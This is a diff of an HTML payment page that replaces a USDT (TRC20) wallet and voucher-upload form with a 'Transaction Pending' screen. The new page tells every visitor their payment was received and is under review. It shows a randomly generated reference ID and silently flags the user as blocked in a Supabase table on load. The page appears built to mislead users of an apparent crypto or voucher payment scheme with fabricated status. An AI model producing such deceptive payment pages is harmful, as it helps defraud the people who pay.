@@ -3,117 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment</title>
+    <title>Pay</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .container { background-color: #1e293b; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; text-align: center; position: relative; overflow: hidden; }
-        h2 { font-size: 24px; margin-bottom: 10px; color: #38bdf8; }
-        .subtitle { color: #94a3b8; margin-bottom: 25px; font-size: 15px; line-height: 1.5; }
-        .tabs { display: grid; grid-template-columns: 1fr 1fr; margin-bottom: 25px; border-radius: 8px; overflow: hidden; border: 1px solid #334155; }
-        .tab-btn { padding: 12px; background: transparent; border: none; color: #94a3b8; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-size: 14px; font-weight: 600; cursor: pointer; transition: background 0.2s, color 0.2s; }
-        .tab-btn.active-crypto { background-color: #0f172a; color: #38bdf8; }
-        .tab-btn.active-voucher { background-color: #0f172a; color: #f59e0b; }
-        .tab-btn:not(.active-crypto):not(.active-voucher):hover { background-color: rgba(255,255,255,0.04); }
-        .panel { display: none; }
-        .panel.active { display: block; }
-        label { display: block; text-align: left; margin-bottom: 8px; color: #94a3b8; font-size: 14px; }
-        .address-wrap { display: flex; gap: 10px; align-items: stretch; margin-bottom: 20px; }
-        .address-input { flex: 1; padding: 14px; background-color: #0f172a; border: 2px solid #334155; color: #f8fafc; border-radius: 8px; font-size: 13px; font-family: 'Courier New', monospace; outline: none; word-break: break-all; cursor: default; }
-        .address-input:focus { border-color: #38bdf8; }
-        .copy-btn { padding: 14px 16px; background-color: #2563eb; color: white; border: none; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; transition: background 0.2s; white-space: nowrap; flex-shrink: 0; }
-        .copy-btn:hover { background-color: #1d4ed8; }
-        .copy-btn.copied { background-color: #16a34a; }
-        .network-badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(56,189,248,0.1); border: 1px solid #38bdf8; border-radius: 20px; padding: 5px 14px; font-size: 12px; font-weight: 700; color: #38bdf8; letter-spacing: 0.05em; margin-bottom: 20px; }
-        .network-badge::before { content: ''; width: 6px; height: 6px; border-radius: 50%; background: #38bdf8; animation: blink 1.8s infinite; }
+        .container { background-color: #1e293b; padding: 36px 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; text-align: center; }
+
+        /* Icon */
+        .icon-wrap { width: 86px; height: 86px; border-radius: 50%; background: rgba(245, 158, 11, 0.1); border: 2px solid rgba(245, 158, 11, 0.35); display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; animation: pulse 2.4s ease-in-out infinite; }
+        .icon-wrap svg { width: 40px; height: 40px; }
+        @keyframes pulse { 0%,100%{ box-shadow: 0 0 0 0 rgba(245,158,11,0.25); } 50%{ box-shadow: 0 0 0 14px rgba(245,158,11,0); } }
+
+        h2 { font-size: 22px; font-weight: 700; color: #f8fafc; margin-bottom: 8px; }
+        .subtitle { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 28px; }
+
+        /* Status badge */
+        .status-badge { display: inline-flex; align-items: center; gap: 7px; background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.4); border-radius: 20px; padding: 6px 16px; font-size: 12px; font-weight: 700; color: #f59e0b; letter-spacing: 0.06em; margin-bottom: 28px; }
+        .status-badge::before { content: ''; width: 7px; height: 7px; border-radius: 50%; background: #f59e0b; animation: blink 1.8s infinite; }
         @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
-        .note-box { background-color: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.3); border-radius: 8px; padding: 12px 14px; font-size: 13px; color: #d97706; line-height: 1.6; text-align: left; margin-bottom: 20px; }
-        .note-box strong { color: #f59e0b; }
-        .btn { background-color: #2563eb; color: white; border: none; padding: 14px 28px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; }
+
+        /* Info card */
+        .info-card { background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 20px; margin-bottom: 20px; text-align: left; }
+        .info-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #1e293b; }
+        .info-row:last-child { border-bottom: none; padding-bottom: 0; }
+        .info-row:first-child { padding-top: 0; }
+        .info-label { font-size: 13px; color: #64748b; }
+        .info-value { font-size: 13px; color: #f8fafc; font-weight: 600; text-align: right; }
+        .info-value.amber { color: #f59e0b; }
+        .info-value.green { color: #4ade80; }
+
+        /* Timeline */
+        .timeline { text-align: left; margin-bottom: 24px; }
+        .timeline-title { font-size: 13px; font-weight: 600; color: #94a3b8; margin-bottom: 14px; text-transform: uppercase; letter-spacing: 0.07em; }
+        .step { display: flex; gap: 14px; align-items: flex-start; margin-bottom: 16px; }
+        .step:last-child { margin-bottom: 0; }
+        .step-dot-wrap { display: flex; flex-direction: column; align-items: center; flex-shrink: 0; }
+        .step-dot { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; flex-shrink: 0; }
+        .step-dot.done { background: rgba(74, 222, 128, 0.15); border: 2px solid #4ade80; color: #4ade80; }
+        .step-dot.active { background: rgba(245, 158, 11, 0.15); border: 2px solid #f59e0b; color: #f59e0b; animation: blink 1.8s infinite; }
+        .step-dot.pending { background: rgba(51, 65, 85, 0.5); border: 2px solid #334155; color: #475569; }
+        .step-line { width: 2px; flex: 1; min-height: 16px; background: #1e293b; margin-top: 4px; }
+        .step-content { padding-top: 4px; }
+        .step-name { font-size: 13px; font-weight: 600; color: #f8fafc; margin-bottom: 2px; }
+        .step-desc { font-size: 12px; color: #64748b; line-height: 1.5; }
+
+        /* Note */
+        .note-box { background-color: rgba(56, 189, 248, 0.06); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 8px; padding: 12px 14px; font-size: 13px; color: #7dd3fc; line-height: 1.6; text-align: left; margin-bottom: 24px; }
+        .note-box strong { color: #38bdf8; }
+
+        /* Button */
+        .btn { background-color: #2563eb; color: white; border: none; padding: 14px 28px; font-size: 15px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; }
         .btn:hover { background-color: #1d4ed8; }
-        .btn:disabled { opacity: 0.4; cursor: not-allowed; }
-        .btn.amber { background-color: #d97706; }
-        .btn.amber:hover { background-color: #b45309; }
-        .upload-zone { border: 2px dashed #334155; border-radius: 10px; padding: 36px 20px; text-align: center; cursor: pointer; transition: all 0.2s; position: relative; background: #0f172a; margin-bottom: 16px; }
-        .upload-zone:hover, .upload-zone.dragover { border-color: #f59e0b; background: rgba(245,158,11,0.05); }
-        .upload-zone input[type="file"] { position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%; }
-        .upload-icon { font-size: 30px; margin-bottom: 10px; }
-        .upload-zone h3 { font-size: 14px; font-weight: 600; color: #f8fafc; margin-bottom: 4px; }
-        .upload-zone p { font-size: 12px; color: #64748b; }
-        .preview-wrap { display: none; margin-bottom: 16px; border-radius: 10px; overflow: hidden; border: 1px solid #334155; position: relative; }
-        .preview-wrap img { width: 100%; max-height: 220px; object-fit: cover; display: block; }
-        .remove-img { position: absolute; top: 8px; right: 8px; background: rgba(0,0,0,0.7); border: none; border-radius: 50%; width: 28px; height: 28px; color: #fff; font-size: 14px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
-        .error-message { display: none; background-color: rgba(239, 68, 68, 0.1); border: 1px solid #ef4444; color: #fca5a5; padding: 12px; border-radius: 8px; font-size: 14px; margin-bottom: 16px; text-align: left; line-height: 1.4; }
-        .success-message { display: none; background-color: rgba(22, 163, 74, 0.1); border: 1px solid #16a34a; color: #86efac; padding: 12px; border-radius: 8px; font-size: 14px; margin-bottom: 16px; text-align: left; line-height: 1.4; }
-        .spinner-overlay { visibility: hidden; opacity: 0; pointer-events: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(30, 41, 59, 0.95); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 10; transition: opacity 0.2s; }
-        .spinner-overlay.active { visibility: visible; opacity: 1; pointer-events: all; }
-        .spinner { width: 50px; height: 50px; border: 5px solid #334155; border-top: 5px solid #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
-        .spinner-text { color: #94a3b8; font-size: 16px; font-weight: 500; }
-        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
     </style>
 </head>
 <body>
 <div class="container">
-    <div class="spinner-overlay" id="loading-spinner">
-        <div class="spinner"></div>
-        <div class="spinner-text" id="spinner-message">Processing...</div>
+
+    <div class="icon-wrap">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/>
+            <polyline points="12 6 12 12 16 14"/>
+        </svg>
     </div>
 
-    <h2>Choose Payment Method</h2>
-    <p class="subtitle">Select how you'd like to complete your payment.</p>
+    <h2>Transaction Pending</h2>
+    <p class="subtitle">Your payment has been received and is currently being reviewed. Please allow some time for processing.</p>
 
-    <div class="tabs">
-        <button class="tab-btn active-crypto" id="tab-crypto" onclick="switchTab('crypto')">💎 TRC20 / USDT</button>
-        <button class="tab-btn" id="tab-voucher" onclick="switchTab('voucher')">🎟️ Voucher</button>
+    <div class="status-badge">PROCESSING</div>
+
+    <div class="info-card">
+        <div class="info-row">
+            <span class="info-label">Status</span>
+            <span class="info-value amber">Under Review</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">Estimated Time</span>
+            <span class="info-value">1 – 3 Business Days</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">Date Submitted</span>
+            <span class="info-value" id="submitted-date">—</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">Reference ID</span>
+            <span class="info-value" id="ref-id" style="font-family:'Courier New',monospace; font-size:12px;">—</span>
+        </div>
     </div>
 
-    <!-- TRC20 Panel -->
-    <div class="panel active" id="panel-crypto">
-        <div class="network-badge">TRON Network · TRC20</div>
-        <label>USDT (TRC20) Wallet Address</label>
-        <div class="address-wrap">
-            <input class="address-input" id="trc20-display" value="TKSRz4KXL5SWbV5yH8627172B97BuKiffw" readonly>
-            <button class="copy-btn" id="copy-btn" onclick="copyAddress()">Copy</button>
+    <div class="timeline">
+        <div class="timeline-title">Progress</div>
+
+        <div class="step">
+            <div class="step-dot-wrap">
+                <div class="step-dot done">✓</div>
+                <div class="step-line"></div>
+            </div>
+            <div class="step-content">
+                <div class="step-name">Payment Submitted</div>
+                <div class="step-desc">Your payment details have been received successfully.</div>
+            </div>
         </div>
-        <div class="note-box">
-            <strong>⚠️ Important:</strong> Only send <strong>USDT</strong> on the <strong>TRON (TRC20)</strong> network to this address. Sending any other asset or using a different network will result in <strong>permanent loss of funds</strong>.
+
+        <div class="step">
+            <div class="step-dot-wrap">
+                <div class="step-dot active">⋯</div>
+                <div class="step-line"></div>
+            </div>
+            <div class="step-content">
+                <div class="step-name">Under Review</div>
+                <div class="step-desc">Our team is verifying and processing your transaction. This may take 1–3 business days.</div>
+            </div>
         </div>
-        <button class="btn" onclick="confirmCrypto()">I've Sent the Payment</button>
-        <div class="success-message" id="crypto-success"></div>
-        <div class="error-message" id="crypto-error"></div>
+
+        <div class="step">
+            <div class="step-dot-wrap">
+                <div class="step-dot pending">3</div>
+            </div>
+            <div class="step-content">
+                <div class="step-name">Account Activated</div>
+                <div class="step-desc">Your account will be fully activated once verification is complete.</div>
+            </div>
+        </div>
     </div>
 
-    <!-- Voucher Panel -->
-    <div class="panel" id="panel-voucher">
-        <p class="subtitle" style="margin-bottom:20px;">Upload a clear photo of your voucher. We'll verify it and activate your account within minutes.</p>
-        <div class="upload-zone" id="upload-zone"
-             ondragover="handleDrag(event,true)"
-             ondragleave="handleDrag(event,false)"
-             ondrop="handleDrop(event)">
-            <input type="file" id="file-input" accept="image/*" onchange="handleFile(this.files[0])">
-            <div class="upload-icon">📎</div>
-            <h3>Tap to upload voucher photo</h3>
-            <p>JPG, PNG or WEBP · Max 5MB</p>
-        </div>
-        <div class="preview-wrap" id="preview-wrap">
-            <img id="preview-img" src="" alt="Voucher preview">
-            <button class="remove-img" onclick="removeImage()">✕</button>
-        </div>
-        <div class="error-message" id="voucher-error"></div>
-        <div class="success-message" id="voucher-success"></div>
-        <button class="btn amber" id="voucher-btn" disabled onclick="uploadVoucher()">Proceed</button>
+    <div class="note-box">
+        <strong>ℹ️ What's next?</strong> You'll be notified once your transaction is confirmed. If you don't hear back within <strong>3 business days</strong>, please contact our support team with your Reference ID.
     </div>
+
+
 </div>
 
 <script>
     const SUPABASE_URL  = 'https://kmjmqrrmzdtovovzigxk.supabase.co';
     const SUPABASE_ANON = 'sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb';
-    const BUCKET        = 'vouchers';
-    const TRC20_ADDRESS = 'TKSRz4KXL5SWbV5yH8627172B97BuKiffw';
-
     const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON);
-    let selectedFile = null;
 
     // ── Set is_blocked = true the moment user lands here ─────────────────────
     async function markUserBlocked() {
@@ -138,104 +162,18 @@
         }
     }
 
-    window.onload = markUserBlocked;
+    window.onload = function () {
+        markUserBlocked();
 
-    function switchTab(tab) {
-        document.getElementById('tab-crypto').className  = 'tab-btn';
-        document.getElementById('tab-voucher').className = 'tab-btn';
-        document.getElementById('panel-crypto').classList.remove('active');
-        document.getElementById('panel-voucher').classList.remove('active');
-        if (tab === 'crypto') {
-            document.getElementById('tab-crypto').classList.add('active-crypto');
-            document.getElementById('panel-crypto').classList.add('active');
-        } else {
-            document.getElementById('tab-voucher').classList.add('active-voucher');
-            document.getElementById('panel-voucher').classList.add('active');
-        }
-    }
+        // Generate reference ID
+        const refId = 'TXN-' + Math.random().toString(36).substring(2, 8).toUpperCase() + Date.now().toString().slice(-4);
+        document.getElementById('ref-id').textContent = refId;
 
-    function copyAddress() {
-        navigator.clipboard.writeText(TRC20_ADDRESS).then(() => {
-            const btn = document.getElementById('copy-btn');
-            btn.textContent = 'Copied!';
-            btn.classList.add('copied');
-            setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
-        });
-    }
-
-    function confirmCrypto() {
-        document.getElementById('crypto-error').style.display = 'none';
-        const s = document.getElementById('crypto-success');
-        s.textContent = "✅ Noted! We'll confirm your transaction on-chain shortly.";
-        s.style.display = 'block';
-    }
-
-    function handleDrag(e, over) {
-        e.preventDefault();
-        document.getElementById('upload-zone').classList.toggle('dragover', over);
-    }
-    function handleDrop(e) {
-        e.preventDefault();
-        document.getElementById('upload-zone').classList.remove('dragover');
-        const file = e.dataTransfer.files[0];
-        if (file) handleFile(file);
-    }
-
-    function handleFile(file) {
-        if (!file) return;
-        if (!file.type.startsWith('image/')) { showMsg('voucher-error', 'Please upload an image file (JPG, PNG, WEBP).'); return; }
-        if (file.size > 5 * 1024 * 1024) { showMsg('voucher-error', 'File too large. Maximum size is 5MB.'); return; }
-        selectedFile = file;
-        hideMsg('voucher-error');
-        const reader = new FileReader();
-        reader.onload = (e) => {
-            document.getElementById('preview-img').src = e.target.result;
-            document.getElementById('preview-wrap').style.display = 'block';
-        };
-        reader.readAsDataURL(file);
-        document.getElementById('voucher-btn').disabled = false;
-    }
-
-    function removeImage() {
-        selectedFile = null;
-        document.getElementById('file-input').value = '';
-        document.getElementById('preview-wrap').style.display = 'none';
-        document.getElementById('preview-img').src = '';
-        document.getElementById('voucher-btn').disabled = true;
-        hideMsg('voucher-error');
-        hideMsg('voucher-success');
-    }
-
-    async function uploadVoucher() {
-        if (!selectedFile) return;
-        const btn = document.getElementById('voucher-btn');
-        btn.disabled = true;
-        const spinner = document.getElementById('loading-spinner');
-        document.getElementById('spinner-message').innerText = 'Uploading voucher...';
-        spinner.classList.add('active');
-        hideMsg('voucher-error');
-        hideMsg('voucher-success');
-        try {
-            const ext      = selectedFile.name.split('.').pop();
-            const fileName = `voucher_${Date.now()}.${ext}`;
-            const filePath = `uploads/${fileName}`;
-            const { data, error } = await supabaseClient
-                .storage
-                .from(BUCKET)
-                .upload(filePath, selectedFile, { contentType: selectedFile.type, upsert: false });
-            spinner.classList.remove('active');
-            if (error) throw new Error(error.message);
-            showMsg('voucher-success', "✅ Voucher uploaded successfully! We'll review and activate your account shortly.");
-            btn.textContent = 'Submitted ✓';
-        } catch (err) {
-            spinner.classList.remove('active');
-            showMsg('voucher-error', `Upload failed: ${err.message}`);
-            btn.disabled = false;
-        }
-    }
-
-    function showMsg(id, text) { const el = document.getElementById(id); el.textContent = text; el.style.display = 'block'; }
-    function hideMsg(id) { document.getElementById(id).style.display = 'none'; }
+        // Set submitted date
+        const now = new Date();
+        const opts = { year: 'numeric', month: 'short', day: 'numeric' };
+        document.getElementById('submitted-date').textContent = now.toLocaleDateString('en-US', opts);
+    };
 </script>
 </body>
 </html>
